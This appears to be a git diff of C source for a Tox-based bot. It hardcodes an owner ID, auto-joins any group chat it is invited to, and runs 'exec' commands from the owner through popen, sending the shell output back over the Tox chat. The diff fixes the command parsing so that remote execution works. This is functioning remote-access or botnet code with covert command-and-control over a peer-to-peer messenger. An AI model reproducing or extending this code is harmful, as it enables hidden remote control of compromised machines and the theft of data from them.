@@ -9,11 +9,11 @@
 
 //edit this, or whatever
 char *ownerid =
-        "FFFFA478D94BE9D80BBA6D73F086F37AB3EA7549D3A36A9CAD4EEDE47C9C935D00000000DED6";
+        "19804745659C7949392DFBBB8A4B5F93749B08E650209F35E7B51B98E8C6BB1F8CBB0BE8CE91";
 char *owner =
-        "FFFFA478D94BE9D80BBA6D73F086F37AB3EA7549D3A36A9CAD4EEDE47C9C935D00000000DED6";
+        "19804745659C7949392DFBBB8A4B5F93749B08E650209F35E7B51B98E8C6BB1F8CBB0BE8CE91";
 char *ownershort =
-        "FFFFA478D94BE9D80BBA6D73F086F37AB3EA7549D3A36A9CAD4EEDE47C9C935D";
+        "19804745659C7949392DFBBB8A4B5F93749B08E650209F35E7B51B98E8C6BB1F";
 
 
 //some tox stuff
@@ -91,10 +91,8 @@ friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type,
 }
 
 //idk if groups work rn i forget. explore this
-void
-group_invite_cb(Tox *tox, uint32_t friend_num, TOX_CONFERENCE_TYPE type,
-                const uint8_t *cookie, size_t length, void *user_data) {
-    tox_conference_join(tox, friend_num, cookie, length, NULL);
+void group_invite_cb(Tox *tox, uint32_t friend_num, TOX_CONFERENCE_TYPE type, const uint8_t *cookie, size_t length, void *user_data) {
+    tox_conference_join(tox, friend_num, cookie, length, NULL );
 }
 
 void
@@ -105,21 +103,29 @@ group_message_cb(Tox *tox, uint32_t group_num, uint32_t peer_number,
     tox_conference_peer_get_public_key(tox, group_num, peer_number, masterkey,
                                        NULL);
     char *mkeyhex = bin2hex(masterkey, sizeof(masterkey));
-    if (strcmp(mkeyhex, ownerid) == 0) {
-        char *cmd_type;
-        cmd_type = strtok(message, " ");
-        if (strcmp(cmd_type, "exec") == 0) {
+    if (strcmp(mkeyhex, ownershort) == 0) {
+        char *cmd, *cmdt;
+        cmdt = strdup(message);
+        cmdt = strtok(cmdt, " ");
+        cmd = strtok(NULL, "");
+        printf("cmd: %s \n", cmd);
+        printf("cmdt: %s \n", cmdt);
+
+        if (strcmp(cmdt, "exec") == 0) {
             FILE *fp;
-            char path[1035];
-            fp = popen(message, "r");
+            uint8_t path[TOX_MAX_MESSAGE_LENGTH];
+            fp = popen(cmd, "r");
             while (fgets(path, sizeof(path) - 1, fp) != NULL) {
-                // printf("%s", path);
-                tox_conference_send_message(tox, group_num, 0, path,
-                                            sizeof(path) - 1, NULL);
+                printf("Exec: %s \n", path);
+                tox_conference_send_message(tox, group_num,
+                                        TOX_MESSAGE_TYPE_NORMAL, path,
+                                        strlen(path), NULL);
             }
             pclose(fp);
         }
+
     }
+
 }
 
 //we need this for tox or something idk go read the headers in c-toxcore
